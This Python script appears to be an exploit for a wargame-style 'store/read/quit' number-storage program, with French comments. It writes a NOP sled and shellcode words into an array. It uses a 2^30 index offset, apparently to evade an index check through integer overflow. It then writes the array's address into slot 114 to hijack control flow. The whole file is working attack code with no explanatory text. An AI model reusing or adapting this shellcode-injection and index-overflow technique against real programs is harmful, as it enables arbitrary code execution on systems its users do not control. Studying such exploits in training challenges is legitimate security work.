import sys, time

i = 0
index = "0"
while i < 46:
	if i % 3 == 0:
		index = str(i + 1073741824)
	else:
		index = str(i)
	if i < 40:
		number = "2425393296" # NOPS
	elif i == 40:
		number = "1352253489"
	elif i == 41:
		number = "1932472168"
	elif i == 42:
		number = "1647274088"
	elif i == 43:
		number = "3817434729"
	elif i == 44:
		number = "3783873360"
	elif i == 45:
		number = "2160921520"
	sys.stdout.write("store\n")
	sys.stdout.flush()
	time.sleep(0.1)
	sys.stdout.write(number + "\n")
	sys.stdout.flush()
	time.sleep(0.1)
	sys.stdout.write(index + "\n")
	sys.stdout.flush()
	time.sleep(0.1)
	i += 1

sys.stdout.write("read\n")
sys.stdout.flush()
time.sleep(0.1)
sys.stdout.write("114\n")
sys.stdout.flush()
time.sleep(0.1)
sys.stdout.write("store\n")
sys.stdout.flush()
time.sleep(0.1)
sys.stdout.write("4294956304\n") # Addresse du debut du tableau
sys.stdout.flush()
time.sleep(0.1)
sys.stdout.write("1073741938\n") # dans la case 114 du tableau 
sys.stdout.flush()
time.sleep(0.1)
sys.stdout.write("quit\n")